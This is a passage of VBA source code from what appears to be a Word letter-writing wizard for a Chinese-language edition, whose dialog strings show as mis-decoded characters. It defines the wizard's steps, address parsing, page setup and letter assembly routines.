        WordBasic.PushButton 147, 170, 75, 20, "´£¥Ü(&H)"   '3
        WordBasic.CancelButton 205, 228, 75, 19 '4
        WordBasic.PushButton 286, 228, 94, 19, "<¤W¤@¨B(&B)"    '5
        WordBasic.PushButton 380, 228, 94, 19, "¤U¤@¨B(&N)>"    '6
        WordBasic.PushButton 476, 228, 75, 19, "§¹¦¨(&F)"   '7
        WordBasic.FilePreview 7, 3, 240, 206, "Preview" '8
        StateItems__(0) = 9 'Number of general (state-independent) controls

    '%% Wizard-specific states go here %%
    'State 1
        WordBasic.Text 259, 9, 229, 19, "ºëÆF¥i¥H³]­p¥X¼ÆºØ«¬¦¡ªº­^¤å«H¥ó¡C"
        WordBasic.Text 269, 45, 104, 13, "±z·Q­n¨º¤@Ãþªº«H¥ó?"
        WordBasic.OptionGroup "LetterMethod"
            WordBasic.OptionButton 290, 84, 215, 16, "¼¶¼g°Ó·~«H¥ó(&B)", "optlm2"
            WordBasic.OptionButton 290, 104, 215, 16, "¼¶¼g¨p¤H«H¥ó(&P)", "optlm3"
        WordBasic.Text 307, 60, 208, 16, "", "Text1" 'Placeholder
        WordBasic.Text 266, 145, 40, 13, kTip$, "tip1"
        WordBasic.Text 315, 145, 208, 66, " ", "tip1text"
        ItemsInState 8  'Number of items in state
    
    'State 2: Letter options
        WordBasic.Text 262, 20, 271, 19, "±z·Q±N­þ¨Ç¶µ¥Ø¥[¤J«H¥ó¤¤?"
        WordBasic.CheckBox 286, 50, 214, 16, "­¶½X(&P)", "chkloPage"
        WordBasic.CheckBox 286, 70, 214, 16, "¤é´Á(&D)", "chkloDate"
        WordBasic.CheckBox 286, 90, 251, 16, "¹q¤l¶l¥ó±b¸¹©Î¤å¥óÃÑ§O½X(&I)", "chkloID"
        WordBasic.CheckBox 286, 110, 214, 16, "¼g«HªÌÃ±¦W(&W)", "chkloWriterInitials"
        WordBasic.CheckBox 286, 130, 214, 16, "¥´¦rªÌÃ±¦W(&T)", "chkloTypistInitials"
        WordBasic.CheckBox 286, 150, 214, 16, "°Æ¥»(&C)", "chkloCC"
        WordBasic.CheckBox 286, 170, 214, 16, "ÀH¨ç(&E)", "chkloEnclosures"
        WordBasic.CheckBox 286, 190, 214, 16, "ªþ¥ó(&A)", "chkloAttachments"
        ItemsInState 9

    'State 3
        WordBasic.Text 277, 44, 230, 18, "±z­n¿ï¨ú¦óºØ®æ¦¡ªº«H¥ó?"
        WordBasic.OptionGroup "UseLetterhead"
            WordBasic.OptionButton 298, 68, 189, 16, "§t¼ÐÀYªº«H¥ó(&L)", "LetterHeadYes"
            WordBasic.OptionButton 298, 88, 189, 16, "¤£§t¼ÐÀYªº«H¥ó(&P)", "LetterHeadNo"
        ItemsInState 4

    'State 4
        WordBasic.Text 267, 7, 273, 17, "±z­n±N«H¥ó¼ÐÀY³]­p©ñ¦b­¶­±¦ó³B?"
        WordBasic.OptionGroup "LetterHeadPosition"
            WordBasic.OptionButton 285, 30, 104, 16, "¾a¤W(&T)", "AtTheTop"
            WordBasic.OptionButton 285, 50, 109, 16, "¾a¥ª(&L)", "OnTheLeft"
            WordBasic.OptionButton 285, 70, 119, 16, "¾a¥k(&R)", "OnTheRight"
        WordBasic.Text 267, 107, 262, 17, "«H¥ó¼ÐÀY³]­p»Ý­n¦h¤jªº¶¡¶Z(&S)?"
        WordBasic.TextBox 286, 125, 65, 18, "textLetterheadSpace"
        WordBasic.Text 261, 172, 40, 13, kTip$, "tip5"
        WordBasic.Text 306, 172, 220, 39, " ", "tip5text"
        ItemsInState 9

    'State 5
        WordBasic.Text 265, 9, 280, 12, "¿é¤J¦¬«H¤H¸ê®Æ©Î¥Ñ³q°T¿ý¤¤¿ï¨ú(&T):"
        WordBasic.TextBox 265, 46, 258, 67, "textRecipientAddress", 1
        WordBasic.Text 265, 115, 115, 12, "±H«H¤H¦a§}(&Y):"
        WordBasic.TextBox 265, 152, 258, 56, "textReturnAddress", 1
        WordBasic.PushButton 398, 24, 127, 21, "³q°T¿ý(&A)...", "Push1" '43
        WordBasic.PushButton 398, 129, 127, 21, "³q°T¿ý(&X)...", "Push2" '44
        ItemsInState 6
        
    'State 6
        WordBasic.Text 258, 42, 300, 17, "±z·Q¿ï¥Î¦óºØ¼Ë¦¡?"
        WordBasic.OptionGroup "WizStyle"
            WordBasic.OptionButton 278, 65, 200, 16, "¥j¨å¦¡(&C)"
            WordBasic.OptionButton 278, 85, 200, 16, "²{¥N¦¡(&O)"
            WordBasic.OptionButton 278, 105, 200, 16, "¼Ð·Ç¦¡(&T)"
        ItemsInState 5

    'State 7: Finish
        WordBasic.Picture 0, 0, 269, 215, "FlagPic", 1, "flag"
        WordBasic.Text 277, 60, 237, 20, "ºëÆF¤w§¹¦¨«Ø¥ß«H¥óªº¸ß°Ý¿ï¶µ!"
        WordBasic.Text 289, 103, 212, 15, "«H¥ó«Ø¥ß¤§«á±zÁÙ·Q°µ¤°»ò?"
        WordBasic.OptionGroup "HelpOrEnvelope"
            WordBasic.OptionButton 308, 126, 222, 14, "«Ø¥ß«H«Ê©Î¶l±H¼ÐÅÒ(&C)"
            WordBasic.OptionButton 308, 146, 222, 16, "¥u­nÅã¥Ü«H¥ó§Y¥i(&J)"
        ItemsInState 6 'Number of items in state
        HideFilePreview__(LastState) = 1
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
    
    ' Set some default values
    WordBasic.CurValues.ToolsOptionsUserInfo toui
    gEnvelopeLabel = 0

    'We're ready (finally!) to throw the wizard onto the screen:
    If WordBasic.Dialog.UserDialog(dlg) = 0 Then
        WordBasic.WaitCursor 1
        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie
        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front for tests
        If WordBasic.Window() <> iWorkDoc Then Exit Sub
        WordBasic.DocClose 2 'Close the document(w/out saving)
        If WordBasic.[WindowName$]() <> emptyDoc$ Then Exit Sub
        WordBasic.DocClose 2 'Close the empty doc
    Else
        WordBasic.WaitCursor 1
        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie
        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front
        WordBasic.ScreenUpdating -1
        If gEnvelopeLabel Then
            If WordBasic.ExistingBookmark("recipAddr") <> 0 Then WordBasic.WW7_EditGoTo "recipAddr"
            dlgEL.ExtractAddress = 0
            x = WordBasic.Dialog.ToolsEnvelopesAndLabels(dlgEL) 'we already setup dlgEL (see below)
            If dlgEL.AddrText = "" Then
                faddr = dlgEL.EnvAddress
            Else
                faddr = dlgEL.AddrText
            End If
            If dlgEL.RetAddrText = "" Then
                freaddr = dlgEL.EnvReturn
            Else
                freaddr = dlgEL.RetAddrText
            End If
            Select Case x
                Case 1
                    If dlgEL.Tab <> "0" Then
                        Application.MailingLabel.DefaultPrintBarCode = False
                        Application.MailingLabel.PrintOut Address:=faddr
                    Else
                        ActiveDocument.Envelope.PrintOut ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr
                    End If
                    ' need to print a document
                Case 2
                    If dlgEL.Tab <> "0" Then
                        Application.MailingLabel.DefaultPrintBarCode = False
                        Application.MailingLabel.CreateNewDocument Address:=faddr
                    Else
                        ActiveDocument.Envelope.Insert ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr
                    End If
                    ' need to do a WindowList(iWorkDoc) here..
                Case Else
                    'do nothing
            End Select
            If WordBasic.ExistingBookmark("letterbody") <> 0 Then
                WordBasic.WW7_EditGoTo "letterbody"
                WordBasic.LineDown 1, 1
            End If
        End If
        WordBasic.FileTemplates Store:=0, Template:=Normal_$, LinkStyles:=0
        'WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as "address" and comes before empty doc.
        iWindowNumber = 1
        While (iWindowNumber <= WordBasic.CountWindows())
            If (WordBasic.[WindowName$](iWindowNumber) = emptyDoc$) Then
                WordBasic.WindowList (iWindowNumber)
                WordBasic.DocClose 2
            End If
            iWindowNumber = iWindowNumber + 1
        Wend
        
    End If
    'All done!
    WordBasic.ScreenUpdating -1
    
End Sub '%% StartWizard

'======================================================
'%% Wizard-specific routines

Private Sub GetPrewrittenDetails()
Dim def$
Dim path$
Dim i
    WordBasic.PrintStatusBar kLookingForLetters$
    def$ = WordBasic.[GetDocumentVar$]("LetterName")
    defLttr = -1
    path$ = xFetchPref$(kLetterPath$) 'Has this been defined in wordwiz.ini??
    If path$ = "" Then path$ = WordBasic.[GetProfileString$](kLetterPath$) '..How about in win.ini/winword6.ini?
    If path$ = "" Then 'No, so assume they're in subdir of program directory
        path$ = WordBasic.[DefaultDir$](9) 'get program directory

        If path$ <> "" Then
            If WordBasic.[Right$](path$, 1) <> "\" Then path$ = path$ + "\"
            path$ = path$ + kLettersDir$        'letters subdirectory
            If WordBasic.[Files$](path$ + "*.*") = "" Then path$ = WordBasic.[Left$](path$, Len(path$) - 8)
        Else
            path$ = WordBasic.[Files$](".")         'this is the best we can do
        End If
    End If
    If WordBasic.[Right$](path$, 1) <> "\" Then path$ = path$ + "\"
    LettersPath$ = path$
    WordBasic.PrintStatusBar kLoadingLetterDetails$
LExit:
End Sub

Private Function GetDefaultUnits()
    Dim dlgTO As Object: Set dlgTO = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral dlgTO
    GetDefaultUnits = dlgTO.Units
End Function

Private Function UnitName$(unit)
    Select Case unit
        Case 0
            UnitName$ = "­^¦T"
        Case 1
            UnitName$ = "¤½¤À"
        Case 2
            UnitName$ = "ÂI¼Æ"
        Case 3
            UnitName$ = "pi"
        Case Else
            UnitName$ = ""
            WordBasic.PrintStatusBar "Unknown units!" 'debug only
    End Select
End Function

Private Function ConvertInchesToUnits(oldVal, newUnits)
Dim newVal
    Select Case newUnits
        Case 0: 'inches
            newVal = oldVal
        Case 1: 'cm
            newVal = oldVal * 2.54
        Case 2: 'pts
            newVal = oldVal * 72
        Case 3: 'pi
            newVal = oldVal * 6
        Case Else
            newVal = oldVal
            WordBasic.PrintStatusBar "Unknown units!"
    End Select
    ConvertInchesToUnits = newVal
End Function

Private Function ConvertUnitsToInches(oldVal, oldUnits)
Dim newVal
    Select Case oldUnits
        Case 0:     'inches
            newVal = oldVal
        Case 1:   'cm
            newVal = oldVal / 2.54
        Case 2: 'pts
            newVal = oldVal / 72
        Case 3: 'pi
            newVal = oldVal / 6
        Case Else
            newVal = oldVal
            WordBasic.PrintStatusBar "Unknown units!"
    End Select
    ConvertUnitsToInches = newVal
End Function

Private Function PrettyMeasurement$(theVal, theUnits)
Dim v
Dim u$
    If (theVal < 11) Then v = WordBasic.Int(theVal * 2 + 0.5) / 2 Else v = WordBasic.Int(theVal)
    u$ = UnitName$(theUnits)
    If theUnits > 0 Then u$ = " " + u$
    PrettyMeasurement$ = WordBasic.[LTrim$](Str(v)) + u$
End Function
        
Rem This function assumes input is in inches
Private Function RightDistanceToLeftDistance$(fromEdgeInches)
Dim fromEdgeDef
    Dim dlgPg As Object: Set dlgPg = WordBasic.DialogRecord.FilePageSetup(False)
    WordBasic.CurValues.FilePageSetup dlgPg
    fromEdgeDef = ConvertInchesToUnits(fromEdgeInches, GetDefaultUnits)
    RightDistanceToLeftDistance$ = Str(WordBasic.Val(dlgPg.PageWidth) - WordBasic.Val(dlgPg.LeftMargin) - WordBasic.Val(dlgPg.RightMargin) - fromEdgeDef)
End Function

Private Sub InsertRedSlot(s$)   'DAPFEL, Changed to a MacroButton
                        'MUST HAVE EmptyMacro macro in .wiz template
    WordBasic.ToolsOptionsView FieldCodes:=1
    WordBasic.InsertField Field:=kMacroButton$
    WordBasic.CharLeft 1
    WordBasic.Insert kEmptyMacro$
    WordBasic.Insert "["
    WordBasic.Insert s$
    WordBasic.Insert "]"
    WordBasic.CharRight 1
    WordBasic.ToolsOptionsView FieldCodes:=0
End Sub

Private Sub SubstituteBananas()
Dim v$
Dim letterIndex
Dim ii
    DoStyleMerge
    If WordBasic.ExistingBookmark("bkAddress") Then
        WordBasic.EditBookmark Name:="bkAddress", GoTo:=1
'If recipient address is same as default address(AT entry) then insert boilerplates
        v$ = WordBasic.[DlgText$]("textRecipientAddress")
        If v$ <> kAddressATEntry$ Then
            If v$ <> "" Then
                WordBasic.Insert v$
            Else
                WordBasic.EditClear 'not able to replace selected text with empty string. Text remains unchanged.
            End If
        Else
            InsertRedSlot kRecipient$
            WordBasic.InsertPara
            InsertRedSlot kEnterRecipientAddress$
        End If
    End If

    If WordBasic.ExistingBookmark("Date") Then
        WordBasic.EditBookmark Name:="Date", GoTo:=1
        WordBasic.InsertDateTime kFormalDateFormat$
    End If
    If WordBasic.ExistingBookmark("bkReturnAddress") Then
        WordBasic.EditBookmark Name:="bkReturnAddress", GoTo:=1
        WordBasic.WW6_EditClear
        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.EditBookmark "bkReturnAddress" 'Plain Paper
        Else
            WordBasic.WW6_EditClear 'Remove Paragraph mark
        End If
    End If
    
    If WordBasic.ExistingBookmark("bkCompany") Then
        WordBasic.EditBookmark Name:="bkCompany", GoTo:=1
        WordBasic.WW6_EditClear

        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.EditBookmark "bkCompany" 'Plain Paper
        Else
            WordBasic.WW6_EditClear 'Remove Paragraph mark
        End If
    End If

    If WordBasic.DlgValue("UseLetterhead") = 1 Then
        If WordBasic.ExistingBookmark("bkCompany") Then
            WordBasic.Style kStyCmpnyName$
            WordBasic.EditBookmark Name:="bkCompany", GoTo:=1
            InsertRedSlot kTypeCompanyName$
        End If
        If (WordBasic.DlgValue("WizStyle") = 1) Then
            WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
        'An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have "Company Name" style
            WordBasic.CharRight 1, 1
            WordBasic.WW6_EditClear
        Else
            WordBasic.InsertPara
        End If 'Wizstyle=1
        
        WordBasic.EditBookmark Name:="bkReturnAddress", GoTo:=1
        WordBasic.Style kStyRetAddr$
        ParseRetAddress
        If (WordBasic.DlgValue("WizStyle") <> 2) Then ' Cntmp or Prof let style
            For ii = 0 To 3
                If (RetAddress__$(ii) <> "") Then
                    WordBasic.Insert RetAddress__$(ii) + Chr(13)
                Else
                    WordBasic.Insert Chr(13)
                End If 'RetAddress...
            Next ii
            If RetAddress__$(4) <> "" Then WordBasic.Insert RetAddress__$(4)
        Else 'elegant style
            For ii = 0 To 3
                If (RetAddress__$(ii) <> "") Then
                    WordBasic.Insert RetAddress__$(ii) + " ¡E "
                Else
                    'Do Nothing
                End If 'RetAddress...
            Next ii
            If RetAddress__$(4) <> "" Then
                WordBasic.Insert RetAddress__$(4)
            Else
                WordBasic.WW6_EditClear -3 'get rid of last bullet
            End If
        End If
    End If 'LetterHead

    If WordBasic.ExistingBookmark("bkName") Then
        WordBasic.EditBookmark Name:="bkName", GoTo:=1
        InsertRedSlot kName$
    End If

    If WordBasic.ExistingBookmark("bkName2") Then
        WordBasic.EditBookmark Name:="bkName2", GoTo:=1
        If toui.Name <> "" Then
            WordBasic.Insert toui.Name
        Else
            InsertRedSlot kName$
        End If
    End If
LDone:
End Sub





Private Sub SetAddress(nm)
Dim AddressText$
Dim ix
Dim iy
Dim Ltemp$
Dim Rtemp$
    On Error GoTo -1: On Error GoTo ErrorSetAddress
    AddressText$ = WordBasic.[GetAddress$]("", "", 0, 1, 0, 0, (nm - 1), 1)
    If AddressText$ = "" Then GoTo SetAddressContinue
    ix = InStr(1, AddressText$, Chr(11))
    While ix <> 0
        iy = Len(AddressText$)
        Ltemp$ = WordBasic.[Left$](AddressText$, (ix - 1))
        Rtemp$ = WordBasic.[Right$](AddressText$, (iy - ix))
        AddressText$ = Ltemp$ + Chr(13) + Rtemp$
        ix = InStr(1, AddressText$, Chr(11))
    Wend
    iy = Len(AddressText$)
    ix = InStr(iy, AddressText$, Chr(13))
    While ix = iy
        AddressText$ = WordBasic.[Left$](AddressText$, (iy - 1))
        iy = Len(AddressText$)
        ix = InStr(iy, AddressText$, Chr(13))
    Wend
    If nm = 1 Then
        WordBasic.DlgText "textRecipientAddress", AddressText$
    ElseIf nm = 2 Then
        WordBasic.DlgText "textReturnAddress", AddressText$
    Else
        'shouldn't happen
    End If 'nm
    GoTo SetAddressContinue
ErrorSetAddress:
    'Only after getting the first MAPI load error, CommandValid ("InsertAddress") returns 0
    If nm = 1 Then 'If error is due to MAPI loading, disable buttons
        WordBasic.DlgFocus 43
        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)
    Else
        WordBasic.DlgFocus 45
        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)
    End If
    On Error GoTo -1: On Error GoTo 0
SetAddressContinue:
End Sub 'SetAddress

Private Function RmTrailingLFs$(tString$) 'nukes extra returns in a string
Dim iy
Dim ix
    iy = Len(tString$)
    If iy = 0 Then GoTo EndOfRmTrailingLFs
    ix = InStr(iy, tString$, Chr(13))
    While ix = iy
        tString$ = WordBasic.[Left$](tString$, (iy - 1))
        iy = Len(tString$)
        ix = InStr(iy, tString$, Chr(13))
    Wend
EndOfRmTrailingLFs:
    RmTrailingLFs$ = tString$
End Function

Private Sub TwoPageHack(num) 'Hacks in a 2nd page header/footer
    WordBasic.WW7_InsertPageBreak
    WordBasic.EndOfDocument
    WordBasic.FilePageSetup DifferentFirstPage:=1
    If num = 1 Then
        WordBasic.ViewHeader
        If (WordBasic.DlgValue("WizStyle") <> 2) Then
            WordBasic.Insert Chr(9) + Chr(9)
        Else
            WordBasic.Insert Chr(9)
        End If
        WordBasic.InsertDateTime kFormalDateFormat$
        WordBasic.ViewNormal
    End If
    If num = 2 Then
        WordBasic.ViewFooter
        If (WordBasic.DlgValue("WizStyle") <> 2) Then
            WordBasic.Insert Chr(9) + Chr(9)
            WordBasic.InsertPageField
        Else
            WordBasic.Insert Chr(9)
            WordBasic.Insert Chr(150) + " "
            WordBasic.InsertPageField
            WordBasic.Insert " " + Chr(150)
        End If
        WordBasic.ViewNormal
    End If
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
End Sub

Private Sub CreateLetter()
Dim recpAddress$
Dim returnAddress$
Dim T$
Dim DateTabPlace$
Dim ii
    WordBasic.PrintStatusBar kCreatingDoc$
    WordBasic.WaitCursor 1
    ' branch on letter type : shrinkwrapped or original
    recpAddress$ = WordBasic.[DlgText$]("textRecipientAddress")
    If (recpAddress$ <> "") Then WordBasic.DlgText "textRecipientAddress", RmTrailingLFs$(recpAddress$)
    returnAddress$ = WordBasic.[DlgText$]("textReturnAddress")
    If (returnAddress$ <> "") Then WordBasic.DlgText "textReturnAddress", RmTrailingLFs$(returnAddress$)

Rem ****************************************************

    If WordBasic.DlgValue("chkloDate") <> 0 Then
        TwoPageHack (1) 'Hacks in a 2nd page header/footer
    End If
    If WordBasic.DlgValue("chkloPage") <> 0 Then
        TwoPageHack (2)
        WordBasic.ViewFooter
        Select Case WordBasic.DlgValue("WizStyle")
            Case 2
                WordBasic.Insert Chr(9)
                WordBasic.Insert Chr(150) + " "
                WordBasic.InsertPageField
                WordBasic.Insert " " + Chr(150)
            Case 1
                WordBasic.Insert Chr(9) + Chr(9)
                WordBasic.InsertPageField
            Case 0
                WordBasic.Font kFntWndngs$
                WordBasic.Insert kDfltPageNum$
                WordBasic.Font kFntArial$
                WordBasic.Insert kPage$
                WordBasic.InsertPageField
        End Select
        WordBasic.ViewNormal
    End If
    If (WordBasic.DlgValue("WizStyle") = 1) And (WordBasic.DlgValue("chkloPage") = 0) Then
        WordBasic.ViewFooter
        WordBasic.Insert " "
        WordBasic.ViewNormal
    End If
    ' this is code for original letters
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
    If WordBasic.DlgValue("UseLetterhead") = 0 Then
        T$ = WordBasic.[DlgText$]("textLetterheadSpace")
        On Error GoTo -1: On Error GoTo LBadMeasurement
        Select Case WordBasic.DlgValue("LetterHeadPosition")
            Case 0  ' at the top
                WordBasic.FilePageSetup TopMargin:=T$
            Case 1    ' on the left
                WordBasic.FilePageSetup LeftMargin:=T$
            Case 2  ' on the right
                WordBasic.FilePageSetup RightMargin:=T$
        End Select
        GoTo LDoneLetterhead
LBadMeasurement:
        WordBasic.DlgFilePreview emptyDoc$
        WordBasic.DocClose 2 'Close the working document(w/out saving)
        Stop
LDoneLetterhead:
        On Error GoTo -1: On Error GoTo 0
    End If
    WordBasic.InsertPara
'Hey, this would be a good time to figure out where the return address/date should go:
    DateTabPlace$ = RightDistanceToLeftDistance$(rtDistToLftDist) '1.25" from the right is what?
    'InsertPara'we're starting *after* return address/date (if included)
    If WordBasic.DlgValue(11) <> 1 Then 'it's not a personal letter
        WordBasic.EditBookmark "recipaddr", Add:=1
        WordBasic.Style kStyInsideAddr$
        WordBasic.Insert WordBasic.[DlgText$]("textRecipientAddress") 'includes name
        WordBasic.InsertPara
    'InsertPara  DAPFEL removed
    End If
    WordBasic.Style kStySal$
    WordBasic.Insert kDear$ '+ DlgText$("textRecipientName")
    WordBasic.EditBookmark "recipient", Add:=1
    InsertRedSlot kRecipient$
    'lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]
    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert "," Else WordBasic.Insert ":"
    WordBasic.InsertPara
    If WordBasic.DlgValue("chkloID") And (WordBasic.DlgValue(11) <> 1) Then
        WordBasic.Style kStySubjLine$
        WordBasic.Insert kRE$
        InsertRedSlot kAccountID$
        WordBasic.InsertPara
    End If
    WordBasic.Style kStyBodyText$
    WordBasic.EditBookmark "letterbody", Add:=1
    InsertRedSlot kTypeHere$
    WordBasic.InsertPara
    WordBasic.FormatTabs ClearAll:=1
    WordBasic.FormatTabs Position:=DateTabPlace$, Set:=1
    WordBasic.Style "µ²»y"
    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert kClosePersonal$ Else WordBasic.Insert kCloseBusiness$
    WordBasic.InsertPara    'space for writer's name
    If WordBasic.DlgValue(11) <> 1 Then 'if not personal
        WordBasic.InsertPara
        WordBasic.Style kStyRefIntls$
        If WordBasic.DlgValue("chkloWriterInitials") Then
            InsertRedSlot kWritersInitials$
            If WordBasic.DlgValue("chkloTypistInitials") Then WordBasic.Insert "/" Else WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloTypistInitials") Then
            InsertRedSlot kTypistsInitials$
            WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloCC") Then
            WordBasic.Style kStyCC$
            WordBasic.Insert kCC$
            InsertRedSlot kNames$
            WordBasic.InsertPara
        End If
        WordBasic.Style kStyEncl$
        If WordBasic.DlgValue("chkloEnclosures") Then
            WordBasic.Insert kEnclosures$
            InsertRedSlot kNumber$
            WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloAttachments") Then
            WordBasic.Insert kAttachments$ + Chr(13)
        End If
    End If 'not personal
    WordBasic.StartOfDocument  ' go back to the start
    If WordBasic.DlgValue("LetterMethod") = 1 Then 'Personal
        If WordBasic.DlgValue("WizStyle") = 1 Then 'Contemporary Style
            WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
            WordBasic.StartOfDocument
        End If 'Contemporary Style
    Else 'if not personal
        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.Style kStyCmpnyName$
            InsertRedSlot kTypeCompanyName$
            If (WordBasic.DlgValue("WizStyle") = 1) Then
                WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
                WordBasic.Style kStyCmpnyName$
            Else
                WordBasic.InsertPara
            End If 'Wizstyle=1
            WordBasic.Style kStyRetAddr$
            ParseRetAddress
            If (WordBasic.DlgValue("WizStyle") <> 2) Then ' Cntmp or Prof let style
                For ii = 0 To 3
                    If (RetAddress__$(ii) <> "") Then
                        WordBasic.Insert RetAddress__$(ii) + Chr(13)
                    Else
                        WordBasic.Insert Chr(13)
                    End If 'RetAddress...
                Next ii
                If RetAddress__$(4) <> "" Then WordBasic.Insert RetAddress__$(4)
            Else 'elegant style
                For ii = 0 To 3
                    If (RetAddress__$(ii) <> "") Then
                        WordBasic.Insert RetAddress__$(ii) + " ¡E "
                    Else
                        'Do Nothing
                    End If 'RetAddress...
                Next ii
                If RetAddress__$(4) <> "" Then
                    WordBasic.Insert RetAddress__$(4)
                Else
                    WordBasic.WW6_EditClear -3 'get rid of last bullet
                End If
            End If
        End If 'LetterHead
    End If 'NotPersonal
    If WordBasic.DlgValue("chkloDate") = 1 Then
        WordBasic.Insert Chr(13)
        WordBasic.Style kStyDate$
        WordBasic.InsertDateTime kFormalDateFormat$
    End If
LPrewrittenContinue:
    WordBasic.StartOfDocument
    WordBasic.ViewPage
    WordBasic.ViewZoom AutoFit:=1
    If WordBasic.DlgValue(11) = 0 Then WordBasic.CharRight 1, 1 'select Company Name
End Sub

Private Sub PickStylePreview()
    WordBasic.StartOfDocument
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
    DoStyleMerge
    Select Case WordBasic.DlgValue("WizStyle")
        Case 0
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
        Case 1
            If WordBasic.DlgValue("UseLetterhead") = 1 Then
                WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
                WordBasic.StartOfDocument
            End If
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
        Case 2
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
    End Select
End Sub

Private Sub DoStyleMerge()
Dim n$
    n$ = ""
    Select Case WordBasic.DlgValue("WizStyle")
        Case 0
            n$ = proflett$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)
        Case 1
            n$ = cntmplet$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist2$ + Chr(34)
        Case 2
            n$ = eleglett$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)
    End Select
    WordBasic.WaitCursor 1
    On Error GoTo -1: On Error GoTo LStyleMissing
    WordBasic.FormatStyleGallery Template:=n$
    WordBasic.DlgUpdateFilePreview
    GoTo LContinue1
LStyleMissing:
    WordBasic.MsgBox kErrStyleNotFound1$ + n$ + kErrStyleNotFound2$, wizname$, 48
LContinue1:
    On Error GoTo -1: On Error GoTo 0
    WordBasic.WaitCursor 0
End Sub

Private Sub ParseRetAddress()
Dim i
Dim temp$
Dim iPos
    For i = 0 To 7
        RetAddress__$(i) = ""
    Next
    i = 0
    temp$ = WordBasic.[DlgText$]("textReturnAddress")
    If temp$ <> "" Then
        iPos = InStr(temp$, Chr(13))
        While iPos And (i < 7)
            If iPos < Len(temp$) Then
                RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)
                temp$ = Mid(temp$, iPos + 1)
                iPos = InStr(temp$, Chr(13))
                i = i + 1
            Else
                If Len(temp$) > 1 Then
                    RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)
                    i = i + 1
                End If
                temp$ = ""
                iPos = 0
            End If
        Wend
        If temp$ <> "" Then
            RetAddress__$(i) = temp$
            i = i + 1
        End If
    End If

    RetAddressLines = i
End Sub


'%% NextState : Determine the next state
Private Function NextState(oldState)    'Determine state that follows oldState
Dim LetterMethod
Dim UseLetterhead
    LetterMethod = WordBasic.DlgValue(11)
    UseLetterhead = WordBasic.DlgValue("UseLetterhead")
    If oldState = 3 And UseLetterhead <> 0 And LetterMethod = 1 Then
        NextState = oldState + 3
    ElseIf oldState = 3 And UseLetterhead <> 0 Then
        NextState = oldState + 2
    ElseIf oldState = 4 And LetterMethod = 1 Then
        NextState = oldState + 2
    Else
        NextState = oldState + 1 'default
    End If
End Function 'NextState

'%% PrevState : Determine the preceding state
Private Function PrevState(oldState)
Dim LetterMethod
Dim UseLetterhead
    LetterMethod = WordBasic.DlgValue(11)
    UseLetterhead = WordBasic.DlgValue("UseLetterhead")
    If oldState = 6 And LetterMethod = 1 And UseLetterhead <> 0 Then
        PrevState = oldState - 3
    ElseIf oldState = 6 And LetterMethod = 1 Then
        PrevState = oldState - 2
    ElseIf oldState = 5 And UseLetterhead <> 0 Then
        PrevState = oldState - 2
    Else
        PrevState = oldState - 1 'Default
    End If
End Function 'PrevState

Private Sub UpdateHeadingPosition()
Dim lhpNew
Dim L$
Dim R$
Dim T$
    lhpNew = WordBasic.DlgValue("LetterHeadPosition")
    If lhpNew <> gCurrentHeadingPosition Then
        WordBasic.WaitCursor 1
        gCurrentHeadingPosition = lhpNew
        L$ = pt90_$: R$ = pt90_$: T$ = pt72_$
        Select Case gCurrentHeadingPosition
            Case 0: T$ = pt216_$
            Case 1: L$ = pt216_$
            Case 2: R$ = pt216_$
        End Select
        WordBasic.FilePageSetup TopMargin:=T$, LeftMargin:=L$, RightMargin:=R$
    PickStylePreview
    End If
End Sub

'%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)
Private Function DoButtonClick(id$, item)
Dim ret
Dim letterIndex
Dim fname$
Dim x
    ret = 0 'Change value of ret when we override standard buttons (eg, "Next")
    'Note: item 6 is "Next>"
    
    If State = 3 And item > StateItems__(0) Then
        If WordBasic.DlgValue("UseLetterhead") = 0 Then
            gCurrentHeadingPosition = -69 'force change
            UpdateHeadingPosition
        Else
            WordBasic.FilePageSetup TopMargin:=pt72_$, LeftMargin:=pt90_$, RightMargin:=pt90_$
            PickStylePreview 'TEST
        End If
        WordBasic.DlgUpdateFilePreview
    End If
    If State = 4 And item > StateItems__(0) Then
        If WordBasic.DlgValue("LetterHeadPosition") <> gCurrentHeadingPosition Then
            UpdateHeadingPosition
